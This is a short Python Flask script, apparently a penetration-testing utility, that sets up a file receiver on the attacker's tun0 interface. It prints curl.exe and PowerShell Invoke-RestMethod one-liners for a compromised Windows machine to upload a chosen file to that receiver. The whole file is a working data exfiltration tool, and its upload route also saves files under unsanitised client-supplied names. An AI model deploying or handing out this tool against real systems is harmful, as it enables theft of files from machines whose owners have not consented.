from flask import Flask, request, jsonify
import os
import argparse
import subprocess
import uuid


UPLOAD_FOLDER = './uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
    file.save(filepath)
    return jsonify({'status': 'success', 'filename': file.filename}), 200

# New endpoint for raw binary uploads
@app.route('/upload-raw', methods=['POST'])
def upload_raw():
    data = request.data
    print(request)
    unique_name = f"{uuid.uuid4().hex}.bin"
    with open(unique_name, "wb") as f:
        f.write(data)
    return {"message": "File uploaded successfully (raw)"}, 200

if __name__ == '__main__':
        
    parser = argparse.ArgumentParser(description="Exfill file receiver via Flask.")
    parser.add_argument('--port', type=int, default=2337, help='Port to listen on (default: 2337)')
    parser.add_argument('--interface', type=str, default='tun0', help='Network interface')
    parser.add_argument('-f', type=str, required=True, help='File to exfill for fast pattern print')
    args = parser.parse_args()

    ip = subprocess.run(
        ['getmyip.sh', f"{args.interface}"],             # Command to run
        capture_output=True,       # Capture stdout and stderr
        text=True,                 # Decode bytes to string
        check=True                 # Raise exception on non-zero exit
    )

    ip = ip.stdout.strip()
    

    print('[+] Exfil script')
    print('[+] cmd syntax')
    print(f"curl.exe -F 'file=@{args.f}' http://{ip}:{args.port}/upload")
    print('[+] Powershell syntax')    
    print(f"Invoke-RestMethod -Uri 'http://{ip}:{args.port}/upload-raw' -Method Post -InFile '{args.f}' -ContentType 'application/octet-stream'")
    print('----')

    app.run(host='0.0.0.0', port=args.port)
